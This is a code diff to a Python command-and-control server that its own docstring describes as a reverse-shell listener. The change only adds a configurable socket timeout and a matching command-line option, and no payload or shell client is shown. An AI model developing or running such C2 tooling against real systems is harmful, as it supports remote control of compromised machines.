@@ -7,7 +7,7 @@ class Server(object):
     """
     A simple command and control server(Reverse Shell).
     """
-    def __init__(self, host="", port=6667, recv_size=1024, listen=10, bind_retry=5):
+    def __init__(self, host="", port=6667, recv_size=1024, listen=10, bind_retry=5, timeout=15.0):
         header = """\n .oOOOo.
 .O     o.
 O       o               O
@@ -35,7 +35,8 @@ o       O o   O `Ooo.   O   OooO'  o
             print('Could not create socket:', error_message)
             sys.exit()
 
-        self.s.settimeout(5.0)
+        self.timeout = float(timeout)
+        self.s.settimeout(self.timeout)
 
         # Bind the socket
         self._bind_the_socket()
@@ -187,6 +188,7 @@ if __name__ == '__main__':
     the_recv_size = 1024
     the_listen = 10
     the_bind_retry = 5
+    the_timeout = 15.0
 
     def check_cli_arg(arg):
         global the_host
@@ -194,6 +196,7 @@ if __name__ == '__main__':
         global the_recv_size
         global the_listen
         global the_bind_retry
+        global the_timeout
 
         if 'host=' in arg:
             the_host = arg.split('=')[1]
@@ -205,6 +208,8 @@ if __name__ == '__main__':
             the_listen = int(arg.split('=')[1])
         elif 'bind_retry=' in arg:
             the_bind_retry = int(arg.split('=')[1])
+        elif 'timeout=' in arg:
+            the_timeout = float(arg.split('=')[1])
 
     for argument in sys.argv[1:]:
         check_cli_arg(argument)
@@ -214,6 +219,7 @@ if __name__ == '__main__':
         port=the_port,
         recv_size=the_recv_size,
         listen=the_listen,
-        bind_retry=the_bind_retry
+        bind_retry=the_bind_retry,
+        timeout=the_timeout
     )
     server.main()
